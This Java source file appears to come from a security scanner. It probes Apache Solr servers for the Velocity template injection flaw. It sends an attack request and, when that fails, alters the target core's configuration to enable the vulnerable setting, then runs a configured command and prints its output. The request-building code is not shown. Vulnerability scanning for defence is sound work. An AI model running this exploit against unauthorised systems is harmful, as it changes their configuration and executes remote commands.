package com.gbw.scanner.plugins.scripts.web.solr.velocity;

import com.gbw.scanner.Host;
import com.gbw.scanner.http.GBWHttpResponse;
import com.gbw.scanner.plugins.scripts.web.solr.GBWScanSolrScript;
import com.gbw.scanner.plugins.scripts.web.solr.GBWScanSolrScriptConfig;
import com.gbw.scanner.plugins.scripts.web.solr.SolrCoreAdmin;
import com.gbw.scanner.plugins.scripts.web.solr.SolrHttpRequestBuilder;
import com.gbw.scanner.sink.SinkQueue;
import com.gbw.scanner.utils.HttpUtils;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.CloseableHttpClient;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class GBWScanSolrVelocityScript extends GBWScanSolrScript {

    private static final Logger log = LoggerFactory.getLogger(GBWScanSolrVelocityScript.class);

    public GBWScanSolrVelocityScript(GBWScanSolrScriptConfig config) {
        super(config);
    }

    @Override
    public boolean isAccept(Host host) {
        return true;
    }


    public String runPoc(CloseableHttpClient httpClient, Host host, String core){

        GBWHttpResponse httpResponse;
        HttpUriRequest httpRequest = SolrHttpRequestBuilder.makeSolrCoreAttackRequest(host,config,core);
        try {

            httpResponse = HttpUtils.send(httpClient,httpRequest,true);
            if(httpResponse.getStatus() == 200){
                /*is ok*/
                return httpResponse.getContent();
            }else {

                /*try to config and try again*/
                httpRequest = SolrHttpRequestBuilder.makeSolrCoreConfigPostRequest(host,config,core);
                HttpUtils.send(httpClient,httpRequest);

                httpRequest = SolrHttpRequestBuilder.makeSolrCoreAttackRequest(host,config,core);

                httpResponse = HttpUtils.send(httpClient,httpRequest,true);

                if(httpResponse.getStatus() == 200)
                    return httpResponse.getContent();
            }
        } catch (Exception e) {
            //e.printStackTrace();
            return null;
        }

        return null;
    }

    public void processResult(SinkQueue sinkQueue,Host host,SolrCoreAdmin solrCoreAdmin,String result,String core){

        int len = result.length();
        if(len<config.getResultLenMax()) {

            if(sinkQueue!=null) {
                GBWScanSolrVelocityScriptResult scriptResult = new GBWScanSolrVelocityScriptResult(config, host, result, solrCoreAdmin,core);
                sinkQueue.put(scriptResult);
            }else{
                System.out.println(String.format("Find a solr velocity template inject bugs in Host:%s:%d", host.getServer(), host.getPort()));
                System.out.println("cmd:"+config.getCmd());
                System.out.println(result);

            }
            log.warn(String.format("Find a solr velocity template inject bugs in Host:%s:%d", host.getServer(), host.getPort()));

        }
    }

    public static void main(String[] args) throws Exception {

        GBWScanSolrScriptConfig config = new GBWScanSolrScriptConfig();
        GBWScanSolrVelocityScript velocityScript = new GBWScanSolrVelocityScript(config);

        velocityScript.runMain(args);
    }
}
